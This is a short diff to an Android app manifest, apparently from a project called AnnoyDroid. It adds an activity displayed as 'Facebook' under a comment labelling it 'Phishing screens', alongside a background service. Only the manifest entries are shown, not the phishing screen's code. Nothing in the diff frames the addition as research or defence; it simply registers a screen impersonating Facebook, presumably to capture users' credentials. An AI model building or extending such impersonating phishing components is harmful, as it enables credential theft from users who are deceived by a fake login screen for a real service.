@@ -18,6 +18,11 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        
+        <!-- Phishing screens -->
+		<activity android:label="Facebook" android:name=".phish.PhacebookActivity"></activity>
+        
+		    <!--  The background service -->
         <service android:enabled="true" android:name="nima.nikzad.annoydroid.AnnoyDroidService" />
     </application>
     
